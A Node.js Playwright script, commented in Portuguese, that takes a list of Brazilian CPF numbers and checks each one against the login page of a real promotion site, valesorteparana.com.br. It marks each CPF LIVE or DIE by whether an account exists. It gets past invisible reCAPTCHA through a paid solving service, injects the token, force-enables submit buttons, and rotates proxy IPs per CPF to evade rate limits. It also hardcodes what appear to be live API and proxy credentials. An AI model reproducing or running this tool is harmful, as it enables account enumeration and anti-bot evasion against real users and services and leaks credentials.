// vale_play_clickforce_recaptcha.js
// Requisitos: npm i playwright axios
// Uso: node vale_play_clickforce_recaptcha.js lista.txt
//
// Funcionalidades:
// - Resolve reCAPTCHA invisível com 2Captcha
// - Injeta o token g-recaptcha-response no DOM
// - Usa proxy rotativo BrightData (1 IP por CPF)
// - Classifica LIVE/DIE

const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { chromium } = require('playwright');
const axios = require('axios');

// Configurações 2Captcha
const CAPTCHA_API_KEY = '99c6cdfca126ca1ffa2b0d2e0991c694';
const CAPTCHA_API_URL = 'http://2captcha.com/in.php';
const CAPTCHA_RES_URL = 'http://2captcha.com/res.php';

const INPUT = process.argv[2] || 'lista.txt';
if (!fs.existsSync(INPUT)) process.exit(1);

const onlyDigits = s => (s||'').toString().replace(/\D+/g,'');
const cpfs = [...new Set(fs.readFileSync(INPUT,'utf8').split(/\r?\n/).map(onlyDigits).filter(Boolean))];

const OUT_DIR = 'saida_vale_chk';
const LIVE_FILE = path.join(OUT_DIR,'live.txt');
const DIE_FILE  = path.join(OUT_DIR,'die.txt');
const LOG_FILE  = path.join(OUT_DIR,'resultado.log');
fs.mkdirSync(OUT_DIR, { recursive: true });
for (const f of [LIVE_FILE, DIE_FILE, LOG_FILE]) if (!fs.existsSync(f)) fs.writeFileSync(f, '');
const append = (f, l) => fs.appendFileSync(f, l + os.EOL, 'utf8');

const URL = 'https://valesorteparana.com.br/autenticar';

// Proxy Bright Data (1 IP/CPF)
const PROXY_HOST = 'brd.superproxy.io';
const PROXY_PORT = 33335;
const PROXY_USER_BASE = 'brd-customer-hl_499adb66-zone-datacenter_proxy2';
const PROXY_PASS = 'l8kr9wg6xk1m';
function proxyConfigWithNewSession() {
  const session = crypto.randomBytes(6).toString('hex');
  return {
    server: `http://${PROXY_HOST}:${PROXY_PORT}`,
    username: `${PROXY_USER_BASE}-session-${session}`,
    password: PROXY_PASS,
  };
}

function maskCPF(cpf) {
  const d = onlyDigits(cpf).padStart(11,'0').slice(-11);
  return `${d.slice(0,3)}.${d.slice(3,6)}.${d.slice(6,9)}-${d.slice(9)}`;
}

// Função para resolver reCAPTCHA com 2Captcha
async function solveRecaptcha(sitekey, pageUrl) {
  try {
    console.log('Enviando reCAPTCHA para 2Captcha...');
    
    // Envia o captcha para resolver
    const submitResponse = await axios.post(CAPTCHA_API_URL, null, {
      params: {
        key: CAPTCHA_API_KEY,
        method: 'userrecaptcha',
        googlekey: sitekey,
        pageurl: pageUrl,
        invisible: 1,
        json: 1
      }
    });

    if (submitResponse.data.status !== 1) {
      throw new Error(`Erro ao enviar captcha: ${submitResponse.data.error_text || 'Unknown error'}`);
    }

    const requestId = submitResponse.data.request;
    console.log(`Captcha enviado, ID: ${requestId}`);

    // Aguarda a resolução
    let attempts = 0;
    const maxAttempts = 60;
    
    while (attempts < maxAttempts) {
      await new Promise(resolve => setTimeout(resolve, 5000)); // Espera 5 segundos
      
      const resultResponse = await axios.get(CAPTCHA_RES_URL, {
        params: {
          key: CAPTCHA_API_KEY,
          action: 'get',
          id: requestId,
          json: 1
        }
      });

      if (resultResponse.data.status === 1) {
        console.log('reCAPTCHA resolvido com sucesso!');
        return resultResponse.data.request;
      }
      
      if (resultResponse.data.request !== 'CAPCHA_NOT_READY') {
        throw new Error(`Erro ao resolver captcha: ${resultResponse.data.error_text || resultResponse.data.request}`);
      }
      
      attempts++;
      console.log(`Aguardando resolução... (${attempts}/${maxAttempts})`);
    }
    
    throw new Error('Timeout ao resolver captcha');
  } catch (error) {
    console.error('Erro ao resolver reCAPTCHA:', error.message);
    throw error;
  }
}

// Função para extrair sitekey do reCAPTCHA
async function extractSitekey(page) {
  return await page.evaluate(() => {
    // Procura em diferentes lugares onde o sitekey pode estar
    const recaptchaDiv = document.querySelector('.g-recaptcha');
    if (recaptchaDiv) return recaptchaDiv.getAttribute('data-sitekey');
    
    const recaptchaScript = Array.from(document.querySelectorAll('script')).find(s => 
      s.src && s.src.includes('google.com/recaptcha') && s.src.includes('render=')
    );
    if (recaptchaScript) {
      const match = recaptchaScript.src.match(/render=([A-Za-z0-9_-]+)/);
      if (match) return match[1];
    }
    
    // Procura no código-fonte
    const htmlContent = document.documentElement.innerHTML;
    const sitekeyMatch = htmlContent.match(/["']sitekey["']\s*:\s*["']([A-Za-z0-9_-]+)["']/);
    if (sitekeyMatch) return sitekeyMatch[1];
    
    const googleKeyMatch = htmlContent.match(/grecaptcha\.execute\(['"]([A-Za-z0-9_-]+)["']/);
    if (googleKeyMatch) return googleKeyMatch[1];
    
    return null;
  });
}

// Função para injetar o token do reCAPTCHA
async function injectRecaptchaToken(page, token) {
  await page.evaluate((token) => {
    // Injeta em todos os possíveis lugares
    const responseFields = document.querySelectorAll('[name="g-recaptcha-response"]');
    responseFields.forEach(field => {
      field.value = token;
      field.innerHTML = token;
    });
    
    // Se tiver um campo hidden específico
    const hiddenResponse = document.getElementById('g-recaptcha-response');
    if (hiddenResponse) {
      hiddenResponse.value = token;
      hiddenResponse.innerHTML = token;
    }
    
    // Tenta executar callback se existir
    if (window.grecaptcha && typeof window.grecaptcha.getResponse !== 'undefined') {
      try {
        const clients = Object.entries(window.___grecaptcha_cfg.clients);
        for (const [key, client] of clients) {
          if (client.callback) {
            client.callback(token);
          }
        }
      } catch (e) {}
    }
    
    // Procura por callbacks customizados
    if (typeof window.onRecaptchaSuccess === 'function') {
      window.onRecaptchaSuccess(token);
    }
    if (typeof window.recaptchaCallback === 'function') {
      window.recaptchaCallback(token);
    }
  }, token);
}

async function typeCpfAndValidate(page, cpf) {
  const input = page.locator('input[name="cpf"]');
  await input.waitFor({ state: 'visible', timeout: 15000 });
  await input.click({ delay: 25 });
  await input.fill('');
  await input.type(maskCPF(cpf), { delay: 15 });
  await input.evaluate(inp => {
    inp.dispatchEvent(new Event('input', { bubbles: true }));
    inp.dispatchEvent(new Event('change', { bubbles: true }));
  });
  await page.keyboard.press('Tab'); // força blur/validação
  await page.waitForTimeout(200);
}

async function ensureButtonEnabled(page) {
  await page.evaluate(() => {
    const btns = Array.from(document.querySelectorAll('button[type="submit"], button, [role="button"]'));
    for (const b of btns) {
      if (/continuar/i.test(b.textContent || '') || b.type === 'submit') {
        b.disabled = false;
        b.classList.remove('disabled');
        b.removeAttribute('aria-disabled');
      }
    }
  });
}

async function clickContinueAllStrategies(page) {
  const targets = [
    page.getByRole('button', { name: /continuar/i }),
    page.locator('button[type="submit"]').first(),
    page.locator('button:has-text("Continuar")').first(),
    page.locator('button').filter({ hasText: /Continuar/i }).first(),
  ];
  for (const t of targets) {
    if (await t.isVisible().catch(()=>false)) {
      await t.scrollIntoViewIfNeeded().catch(()=>{});
      try { await t.click({ timeout: 5000 }); return true; } catch {}
      try { await t.click({ timeout: 3000, force: true }); return true; } catch {}
      try { const box = await t.boundingBox(); if (box) { await page.mouse.move(box.x+box.width/2, box.y+box.height/2); await page.mouse.down(); await page.mouse.up(); return true; } } catch {}
    }
  }
  try { await page.keyboard.press('Enter'); await page.waitForTimeout(150); return true; } catch {}
  try { await page.keyboard.press('Space'); await page.waitForTimeout(150); return true; } catch {}
  const submitted = await page.evaluate(() => {
    const forms = Array.from(document.querySelectorAll('form'));
    if (forms[0]) { forms[0].requestSubmit ? forms[0].requestSubmit() : forms[0].submit(); return true; }
    const vis = el => !!(el && el.offsetParent !== null);
    const btn = Array.from(document.querySelectorAll('button, [role="button"]')).find(b => vis(b) && /continuar/i.test(b.textContent || ''));
    if (btn) { btn.click(); return true; }
    const sub = document.querySelector('button[type="submit"]');
    if (sub && vis(sub)) { sub.click(); return true; }
    return false;
  });
  return submitted;
}

async function classify(page, total, idx, cpf) {
  let apiResult = null;
  page.on('response', async (res) => {
    try {
      if (res.request().method() === 'POST' && res.url().includes('/v1/user/identification')) {
        const s = res.status();
        let d = null; try { d = await res.json(); } catch {}
        apiResult = { status: s, data: d };
      }
    } catch {}
  });

  await page.goto(URL, { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.waitForLoadState('networkidle', { timeout: 45000 }).catch(()=>{});
  await page.waitForTimeout(500);

  // Extrai o sitekey do reCAPTCHA
  const sitekey = await extractSitekey(page);
  if (sitekey) {
    console.log(`Sitekey encontrado: ${sitekey}`);
    
    try {
      // Resolve o reCAPTCHA
      const recaptchaToken = await solveRecaptcha(sitekey, URL);
      
      // Injeta o token no DOM
      await injectRecaptchaToken(page, recaptchaToken);
      console.log('Token do reCAPTCHA injetado com sucesso!');
      
      // Pequena pausa para garantir que o token foi processado
      await page.waitForTimeout(1000);
    } catch (error) {
      console.error('Erro ao resolver reCAPTCHA:', error.message);
      // Continua mesmo se falhar o captcha
    }
  } else {
    console.log('reCAPTCHA não encontrado na página');
  }

  await typeCpfAndValidate(page, cpf);
  await ensureButtonEnabled(page);
  await clickContinueAllStrategies(page);

  let live = null;
  const t0 = Date.now();
  while (Date.now() - t0 < 45000 && live === null) {
    if (apiResult) { live = apiResult?.data?.isRegistered === true; break; }
    const passField = page.locator('input[name="password"], input[type="password"]');
    if (await passField.isVisible().catch(()=>false)) { live = true; break; }
    const notRegistered = page.locator('text=/não.*cadastrad/i').first();
    if (await notRegistered.isVisible().catch(()=>false)) { live = false; break; }
    await page.waitForTimeout(250);
  }

  if (live === null) throw new Error('Timeout (API/UI)');

  const status = live ? 'LIVE' : 'DIE';
  const line = `${idx}/${total} ${status} ${cpf}${apiResult ? ` HTTP:${apiResult.status}` : ''}`;
  append(LOG_FILE, line);
  append(live ? LIVE_FILE : DIE_FILE, cpf);
  
  console.log(`${idx}/${total} ${status} ${cpf}`);
}

(async () => {
  console.log(`Iniciando verificação de ${cpfs.length} CPFs...`);
  console.log(`Usando 2Captcha API Key: ${CAPTCHA_API_KEY.substring(0, 10)}...`);
  
  for (let i = 0; i < cpfs.length; i++) {
    const browser = await chromium.launch({
      headless: false, // Mude para true se quiser rodar sem interface
      proxy: proxyConfigWithNewSession(),
    });
    const ctx = await browser.newContext({
      viewport: { width: 1360, height: 900 },
      locale: 'pt-BR',
      timezoneId: 'America/Sao_Paulo',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    });
    const page = await ctx.newPage();

    try {
      await classify(page, cpfs.length, i+1, cpfs[i]);
    } catch (e) {
      console.error(`${i+1}/${cpfs.length} ERROR ${cpfs[i]} ${e.message}`);
      append(LOG_FILE, `${i+1}/${cpfs.length} ERROR ${cpfs[i]} ${e.message}`);
      append(DIE_FILE, cpfs[i]);
    } finally {
      await ctx.close();
      await browser.close();
    }

    await new Promise(r => setTimeout(r, 300));
  }
  console.log(`Finalizado. Resultados em: ${OUT_DIR}`);
})();